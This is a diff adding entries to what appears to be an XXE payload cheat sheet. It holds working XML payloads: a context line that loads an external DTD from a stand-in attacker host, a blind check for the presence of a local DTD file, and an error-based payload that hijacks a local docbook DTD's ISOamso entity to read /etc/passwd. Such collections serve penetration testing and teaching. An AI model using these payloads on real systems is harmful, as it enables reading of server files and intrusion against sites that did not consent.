@@ -102,3 +102,29 @@ Trigger vulnerability:
 ```
 <!DOCTYPE hh [ <!ENTITY % e SYSTEM "https://web-attacker.com/exploit.dtd"> %e;]>
 ```
+
+### Blind XXE verifying presence of file
+
+If any errors show up it is because the file don't exist.
+
+```
+<!DOCTYPE xx [
+<!ENTITY % x SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%x;]>
+```
+
+### Blind XXE triggering via internal DTD
+
+```
+<!DOCTYPE xx [
+	<!ENTITY % x SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+	<!ENTITY % ISOamso '
+		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+		<!ENTITY &#x25; y "<!ENTITY &#x26;#x25; exf SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+		&#x25;y;
+		&#x25;exf;
+	'>
+	%x;
+]> 
+```
+
